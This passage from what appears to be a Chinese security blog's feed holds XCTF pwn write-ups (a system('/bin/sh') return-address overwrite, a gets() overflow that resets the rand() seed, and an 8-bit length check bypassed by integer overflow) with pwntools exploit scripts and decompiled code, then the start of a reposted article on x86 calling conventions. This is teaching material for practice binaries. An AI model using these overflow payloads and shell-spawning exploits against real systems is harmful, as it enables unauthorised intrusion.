str(p32(system),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(/bin/sh),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&quot;a&quot;*0x88</code>：这是buf要填充的字节</li><li><code>&quot;a&quot;*4</code>：是填充<code>Old Ebp</code>的字节</li><li><code>str(p32(system),encoding=&quot;unicode_escape&quot;)</code>：是system的地址</li><li><code>&quot;a&quot;*4</code>：作为system函数的返回地址</li><li><code>str(p32(/bin/sh),encoding=&quot;unicode_escape&quot;)</code>：是system参数/bin/sh的地址</li></ul></blockquote><p><img src="/images/122-1.png" alt></p><h4 id="4exp-4"><a class="markdownIt-Anchor" href="#4exp-4"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">35965</span>)</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>,arch=<span class="string">"i386"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">"a"</span> + <span class="number">4</span>*<span class="string">"a"</span> + str(p32(<span class="number">0x08048320</span>),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(<span class="number">0x0804A024</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x04-guess_numfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-guess_numfont"></a> <font color="navy"><code>0x04 guess_num</code></font></h3><h4 id="1相关知识点-5"><a class="markdownIt-Anchor" href="#1相关知识点-5"></a> <code>1.相关知识点</code></h4><blockquote><ol><li><code>srand()</code>、<code>rand()</code>函数</li><li>python的<a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html" target="_blank" rel="noopener"><code>ctypes</code></a>外部函数库</li></ol></blockquote><h4 id="2解题思路-5"><a class="markdownIt-Anchor" href="#2解题思路-5"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file guess_num </span><br><span class="line">guess_num: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该pwn文件也是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec guess_num </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/guess_num/guess_num&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><blockquote><p>几乎能开的保护全都开启了，所以这无疑增加了这道题目的难度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi@7</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [sp+30h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v4) = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  *(_QWORD *)seed = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;v11);</span><br><span class="line">  v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)seed[<span class="number">0</span>];</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="string">"Success!"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E(v5);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v7 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v13;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们采用逆推的思想，从上面的源代码可以看出，要想输出“Success”，就必须使得我们10次的输入与随机化产生的数值要想等，在之前还要输入一个name变量的字符串，可以看出gets()是一个危险函数，因为他不判断输入的长度，所以我们可以利用这一点。</p><p><br>再来看一下seed[2]的起始位置<code>bp-10h</code>，以及v11的位置<code>bp-30h</code>，所以说seed[0]的位置为<code>ebp-10h</code>，seed[1]的位置为<code>ebp-20h</code>，我们是不是可以通过gets函数，来改变seed[0]的值呢？答案是可以的，虽然开启了金丝雀和栈不可执行，但是这两个空间是一个连续空间，金丝雀并不会产生影响。</p><p><br>我们根据赋的值自己生成一下产生的10个（伪）随机数值，然后我们就可以获得flag</p></blockquote><h4 id="3解题步骤-5"><a class="markdownIt-Anchor" href="#3解题步骤-5"></a> <code>3.解题步骤</code></h4><blockquote><p>假如seed[0]被我们填充的为3时，产生的数值是什么？我们写了一个下面的脚本：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        srand(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i &lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>产生的数字为：<code>1</code>、<code>2</code>、<code>1</code>、<code>1</code>、<code>4</code>、<code>5</code>、<code>1</code>、<code>5</code>、<code>2</code>、<code>5</code>。那么下面我们可以写出我们的payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">49881</span>)</span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">"a"</span> + str(p64(<span class="number">3</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.recvline(<span class="string">"your name!"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">num = <span class="string">"1211451525"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">    r.recvline(<span class="string">"guess number:"</span>)</span><br><span class="line">    r.sendline(i)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="5存在的问题-2"><a class="markdownIt-Anchor" href="#5存在的问题-2"></a> <code>5.存在的问题</code></h4><blockquote><p>网上用到了这样的exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./d22084e1938f4b21a380e38e2fb48629'</span>)</span><br><span class="line"><span class="comment"># p = remote("111.198.29.45", 39368)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">'Your name:'</span>, payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    num = str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> num + <span class="string">'\n'</span></span><br><span class="line">    p.sendlineafter(<span class="string">'number:'</span>,num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-int_overflow"><a class="markdownIt-Anchor" href="#0x05-int_overflow"></a> <code>0x05 int_overflow</code></h3><h4 id="1相关知识点-6"><a class="markdownIt-Anchor" href="#1相关知识点-6"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>数据类型大小：会产生溢出的情况</li></ol><p><img src="/images/122-5.png" alt></p></blockquote><h4 id="2解题思路-6"><a class="markdownIt-Anchor" href="#2解题思路-6"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file int_overflow </span><br><span class="line">int_overflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>int_overflow</code>文件是一个32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec int_overflow </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/int_flow/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       1.Login       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// login()函数</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-228h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+200h] [bp-28h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your passwd:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check_passwd(&amp;buf)函数</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+4h] [bp-14h]@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [sp+Fh] [bp-9h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们将上面的函数关系画一个简单的示意图，如下：</p></blockquote><p><img src="/images/122-7.png" alt></p><blockquote><p>现在对上面的源代码进行详细分析一下：该程序有两三处输入点：</p><ul><li>第一个是选择登录或者退出</li><li>第二个是输入我们的name</li><li>第三个是输入密码，而且passwd的最大输入长度为<code>0x199u</code>，并且在check_passwd检查passwd的长度，如果长度大于3小于等于8的话，输出“Success”，并且返回一个指向最终的目标字符串 dest 的指针<code>result</code>；否则输出“Invalid Password”，结束执行。而dest的位置为<code>ebp-14h</code>。这里还要注意一点就是v3是一个一字节长度的变量，前面对passwd进行长度限制时，最大长度为0x199，这很明显一个字节存储不下。那么会发生什么呢？整数溢出。</li></ul></blockquote><h4 id="3解题步骤-6"><a class="markdownIt-Anchor" href="#3解题步骤-6"></a> <code>3.解题步骤</code></h4><p>      首先先看一下怎么绕过<code>v3 &lt;= 3u || v3 &gt; 8u</code>，在这里v3是一个单字节变量，且是passwd的长度，而由于passwd最长可以输入<code>0x199</code>长度的字符串，所以我们先算好应该输入多长的passwd才能绕过if的判断语句：</p><blockquote><p>因为v3是单字节，也就是8个bit，正常来说v3为<code>0000 0100</code>到<code>0000 1000</code>区间都可以，也就是在[4,8]区间，如果v3的最高位产生了溢出，比如第9位为1，那么输入的长度应该在<code>1 0000 0100</code>到<code>1 0000 1000</code>，也就是[260,264]区间，在这里我们选择输入的长度为262</p></blockquote><p>      观察dest相对ebp的位置，从IDA中可以看出，dest位于<code>ebp-0x14</code>的位置，然后又因为存在一个<code>old ebp</code>，所以前面需要<code>0x14+4=0x18</code>字节的填充；</p><p>      我们又从IDA中可以找出<code>what_is_this</code>函数，该函数可以打印<code>flag.txt</code>，因为前面已经输入<code>0x14+4+4=0x1c</code>长度的字节，所以现在还剩<code>262-0x1c=234</code>长度的填充，示意图如下：</p><p><img src="/images/122-8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-when_did_you_bornfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-when_did_you_bornfont&quot;&gt;&lt;/a&gt; &lt;font
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】常见调用约定总结</title>
    <link href="https://muzibing.github.io/2020/05/31/2020.05.31%EF%BC%88121%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/31/2020.05.31（121）/</id>
    <published>2020-05-30T16:00:00.000Z</published>
    <updated>2020-05-31T15:27:05.848Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-常见的调用约定"><a href="#0x00-常见的调用约定" class="headerlink" title="0x00 常见的调用约定"></a><font color="navy">0x00 常见的调用约定</font></h3><h4 id="一、cdecl调用约定"><a href="#一、cdecl调用约定" class="headerlink" title="一、cdecl调用约定"></a><code>一、cdecl调用约定</code></h4><blockquote><p>又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。<font color="navy"><strong>函数参数按照从右到左的顺序入栈</strong>，<strong>函数调用者负责清除栈中的参数</strong>，<strong>返回值在EAX中</strong>。</font>由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p></blockquote><h4 id="二、stdcall调用约定-微软命名"><a href="#二、stdcall调用约定-微软命名" class="headerlink" title="二、stdcall调用约定(微软命名)"></a><code>二、stdcall调用约定(微软命名)</code></h4><blockquote><p>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。<font color="navy"><strong>stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中</strong>。</font>stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如<code>_functionname@number</code></p></blockquote><h4 id="三、fastcall调用约定"><a href="#三、fastcall调用约定" class="headerlink" title="三、fastcall调用约定"></a><code>三、fastcall调用约定</code></h4><blockquote><p>stdcall调用约定的变形，<font color="navy"><strong>通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。</strong></font>因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p></blockquote><h4 id="四、thiscall调用约定"><a href="#四、thiscall调用约定" class="headerlink" title="四、thiscall调用约定"></a><code>四、thiscall调用约定</code></h4><blockquote><p> C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p><br>thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p><p><br>注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p></blockquote><h4 id="五、naked-call调用约定"><a href="#五、naked-call调用约定" class="headerlink" title="五、naked call调用约定"></a><code>五、naked call调用约定</code></h4><blockquote><p>对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><p><br>代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="keyword">int</span> __<span class="function">stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    